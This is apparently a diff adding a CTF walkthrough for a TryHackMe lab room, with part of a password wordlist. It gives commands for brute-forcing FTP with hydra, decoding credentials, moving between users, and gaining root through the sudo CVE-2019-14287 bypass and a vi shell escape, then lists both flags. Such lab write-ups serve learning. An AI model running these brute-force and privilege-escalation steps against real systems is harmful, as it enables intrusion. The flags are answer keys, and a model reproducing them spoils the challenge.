@@ -87,3 +87,92 @@ ki^t!+uqB?DyI
 5iez1wGXKfPKQ
 nJ90XzX&AnF5v
 7EiMd5!r%=18c
+wYyx6Eq-T^9#@
+yT2o$2exo~UdW
+ZuI-8!JyI6iRS
+PTKM6RsLWZ1&^
+3O$oC~%XUlRO@
+KW3fjzWpUGHSW
+nTzl5f=9eS&*W
+WS9x0ZF=x1%8z
+Sr4*E4NT5fOhS
+hLR3xQV*gHYuC
+4P3QgF5kflszS
+NIZ2D%d58*v@R
+0rJ7p%6Axm05K
+94rU30Zx45z5c
+Vi^Qf+u%0*q_S
+1Fvdp&bNl3#&l
+zLH%Ot0Bw&c%9
+### hydra
+```text
+nano pass.lst
+```
+```text
+hydra -l ftpuser -P /home/kali/Downloads/year_rabbit/pass.lst 10.10.55.241 ftp
+```
+==[21][ftp] host: 10.10.55.241   login: ftpuser   password: 5iez1wGXKfPKQ==
+### ftp
+```text
+ftp 10.10.55.241
+```
+`enter user and pass found with hydra`
+```text
+get Eli's_Creds.txt
+```
+[brainfuck decode](https://www.dcode.fr/brainfuck-language)
+>+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
+--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
+++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
++++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
+]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
+++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
+--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
++<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
+++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
+<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
+<]>+. <+++[ ->--- <]>-- ---.- ----. <
+==User: eli
+Password: DSpDiM1wAEwid==
+### ssh
+```text
+find -name s3cr3t 2>/dev/null
+```
+```text
+cd /usr/games/s3cr3t
+```
+```text
+cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
+```
+>Your password is awful, Gwendoline.
+It should be at least 60 characters long! Not just MniVCQVhQHUNI
+Honestly!
+Yours sincerely
+-Root
+```text
+su gwendoline
+```
+`pass: MniVCQVhQHUNI`
+### pirv esc
+
+## Privilege Escalation
+```text
+sudo -l
+```
+==(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt==
+`sudo-cve-2019-14287 `
+```text
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+```
+==press : then !/bin/sh==
+```root
+whoami
+```
+```text
+cat /root/root.txt
+```
+
+## Flags / Answers
+- What is the user flag? ***THM{1107174691af9ff3681d2b5bdb5740b1589bae53}***
+- What is the root flag? ***THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}***
+
